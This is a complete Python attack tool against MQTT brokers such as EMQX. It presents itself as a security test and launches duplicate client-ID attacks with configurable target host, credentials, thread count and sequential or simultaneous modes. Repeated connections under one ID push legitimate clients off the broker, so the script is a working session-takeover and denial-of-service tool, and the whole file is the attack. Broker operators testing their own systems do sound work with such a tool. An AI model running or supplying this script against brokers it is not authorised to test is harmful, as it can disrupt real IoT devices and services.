#!/usr/bin/env python3
"""
MQTT Duplicate ID Attack Script (Windows Compatible)
====================================================
Simulates duplicate client ID attacks to test EMQX client management and security.
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone

class DuplicateIDAttack:
    def __init__(self, broker_host="localhost", broker_port=1883, 
                 username=None, password=None, use_tls=False):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.username = username
        self.password = password
        self.use_tls = use_tls
        self.attack_stats = {
            "duplicate_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }
        
    def create_client(self, client_id):
        """Create MQTT client with security settings"""
        try:
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)
            
            if self.use_tls:
                client.tls_set()
            
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None
    
    def duplicate_id_worker(self, worker_id, duplicate_client_id, num_attempts=10, delay_ms=1000):
        """Worker thread for duplicate ID attack"""
        print(f" Worker {worker_id}: Starting duplicate ID attack with client ID: {duplicate_client_id}")
        
        for attempt in range(num_attempts):
            try:
                # Create client with duplicate ID
                client = self.create_client(duplicate_client_id)
                
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue
                
                def on_connect(client, userdata, flags, rc, properties):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        print(f" Worker {worker_id}: Attempt {attempt+1} - Connected with duplicate ID: {duplicate_client_id}")
                        
                        # Send some messages
                        for i in range(5):
                            try:
                                payload = {
                                    "attack_type": "duplicate_id",
                                    "worker_id": worker_id,
                                    "attempt": attempt + 1,
                                    "message_id": i,
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "duplicate_data": "D" * random.randint(100, 500)
                                }
                                
                                result = client.publish("test/duplicate", json.dumps(payload), qos=0)
                                if result.rc == 0:
                                    self.attack_stats["messages_sent"] += 1
                                
                            except Exception as e:
                                print(f" Worker {worker_id}: Error sending message: {e}")
                        
                        # Stay connected for a while
                        time.sleep(2)
                        
                    elif rc == 1:
                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (invalid protocol)")
                        self.attack_stats["connections_failed"] += 1
                    elif rc == 2:
                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (invalid client ID)")
                        self.attack_stats["connections_failed"] += 1
                    elif rc == 3:
                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (server unavailable)")
                        self.attack_stats["connections_failed"] += 1
                    elif rc == 4:
                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (bad username/password)")
                        self.attack_stats["connections_failed"] += 1
                    elif rc == 5:
                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (not authorized)")
                        self.attack_stats["connections_failed"] += 1
                    else:
                        print(f" Worker {worker_id}: Attempt {attempt+1} - Connection failed: {rc}")
                        self.attack_stats["connections_failed"] += 1
                
                def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
                    self.attack_stats["disconnections"] += 1
                    if reason_code != 0:
                        print(f" Worker {worker_id}: Unexpected disconnection: {reason_code}")
                
                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                
                # Connect to broker
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                
                self.attack_stats["duplicate_attempts"] += 1
                
                # Wait for connection to establish
                time.sleep(3)
                
                # Disconnect
                client.loop_stop()
                client.disconnect()
                
                # Delay between attempts
                if delay_ms > 0:
                    time.sleep(delay_ms / 1000.0)
                    
            except Exception as e:
                print(f" Worker {worker_id}: Error in attempt {attempt+1}: {e}")
                self.attack_stats["connections_failed"] += 1
        
        print(f" Worker {worker_id}: Completed duplicate ID attack")
    
    def simultaneous_duplicate_worker(self, worker_id, duplicate_client_id, duration_seconds=30):
        """Worker thread for simultaneous duplicate ID attack"""
        print(f" Worker {worker_id}: Starting simultaneous duplicate ID attack with client ID: {duplicate_client_id}")
        
        try:
            # Create client with duplicate ID
            client = self.create_client(duplicate_client_id)
            
            if not client:
                self.attack_stats["connections_failed"] += 1
                return
            
            def on_connect(client, userdata, flags, rc, properties):
                if rc == 0:
                    self.attack_stats["connections_successful"] += 1
                    print(f" Worker {worker_id}: Simultaneous connection successful with ID: {duplicate_client_id}")
                else:
                    print(f" Worker {worker_id}: Simultaneous connection failed: {rc}")
                    self.attack_stats["connections_failed"] += 1
            
            def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
                self.attack_stats["disconnections"] += 1
                print(f" Worker {worker_id}: Disconnected: {reason_code}")
            
            client.on_connect = on_connect
            client.on_disconnect = on_disconnect
            
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            
            self.attack_stats["duplicate_attempts"] += 1
            
            # Stay connected for specified duration
            time.sleep(duration_seconds)
            
            # Disconnect
            client.loop_stop()
            client.disconnect()
            
        except Exception as e:
            print(f" Worker {worker_id}: Error in simultaneous attack: {e}")
            self.attack_stats["connections_failed"] += 1
        
        print(f" Worker {worker_id}: Completed simultaneous duplicate ID attack")
    
    def launch_attack(self, attack_type="sequential", num_workers=3, duplicate_client_id=None, 
                     num_attempts=10, delay_ms=1000, duration_seconds=30):
        """Launch duplicate ID attack"""
        if duplicate_client_id is None:
            duplicate_client_id = "duplicate_attacker"
        
        print(f" Starting Duplicate ID Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Duplicate client ID: {duplicate_client_id}")
        print(f"   Attempts per worker: {num_attempts}")
        print(f"   Delay: {delay_ms}ms")
        print("=" * 60)
        
        self.attack_stats["start_time"] = time.time()
        
        # Create worker threads
        threads = []
        
        if attack_type == "simultaneous":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.simultaneous_duplicate_worker,
                    args=(i, duplicate_client_id, duration_seconds)
                )
                threads.append(thread)
        else:  # sequential
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.duplicate_id_worker,
                    args=(i, duplicate_client_id, num_attempts, delay_ms)
                )
                threads.append(thread)
        
        # Start all workers
        for thread in threads:
            thread.start()
        
        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")
        
        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()
    
    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Duplicate attempts: {self.attack_stats['duplicate_attempts']}")
        print(f"Connections successful: {self.attack_stats['connections_successful']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Disconnections: {self.attack_stats['disconnections']}")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        
        if self.attack_stats['duplicate_attempts'] > 0:
            success_rate = (self.attack_stats['connections_successful'] / 
                           self.attack_stats['duplicate_attempts'] * 100)
            print(f"Connection success rate: {success_rate:.1f}%")
        
        if duration > 0:
            print(f"Attempts per second: {self.attack_stats['duplicate_attempts']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Duplicate ID Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
    parser.add_argument("--type", choices=["sequential", "simultaneous"], default="sequential", 
                       help="Attack type: sequential or simultaneous")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--client-id", help="Duplicate client ID to use")
    parser.add_argument("--attempts", type=int, default=10, help="Attempts per worker (sequential)")
    parser.add_argument("--delay", type=int, default=1000, help="Delay between attempts (ms)")
    parser.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = DuplicateIDAttack(
        broker_host=args.broker,
        broker_port=args.port,
        username=args.username,
        password=args.password,
        use_tls=args.tls
    )
    
    # Launch attack
    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        duplicate_client_id=args.client_id,
        num_attempts=args.attempts,
        delay_ms=args.delay,
        duration_seconds=args.duration
    )

if __name__ == "__main__":
    main()
